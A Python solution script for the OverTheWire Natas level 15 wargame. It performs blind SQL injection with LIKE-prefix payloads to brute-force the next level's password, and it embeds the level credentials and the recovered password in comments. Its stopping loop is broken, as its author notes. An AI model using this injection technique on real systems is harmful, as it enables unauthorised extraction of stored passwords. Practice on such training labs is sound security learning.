#!/usr/bin/python3

import requests
import string

alphabet = string.ascii_letters + string.digits
# print(alphabet)

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url = 'http://%s.natas.labs.overthewire.org/?debug=true' %username
# proxies = {
# 	"http" : "socks5://127.0.0.1:9050"
# }


data = {
		"username" : 'natas16" AND password LIKE "%" #' ,
}
s = requests.Session()


seen_pass = list()

while True:
	for ch in alphabet:
		print("Trying letter .. " + "".join(seen_pass) + ch	) 
		response = s.post(url, data={"username": 'natas16" AND BINARY password LIKE "'+ "". join(seen_pass) + ch + '%" #' }, auth=(username,password))

		content = response.text

		if ('user exists' in content):
			print(response.text)
			seen_pass.append(ch)
			while len(seen_pass) != 32:
				break
			else:
				continue

print("The password is " + "".join(seen_pass))

# password is natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V	
# will have to fix the code to stop at exact 32 characters

	

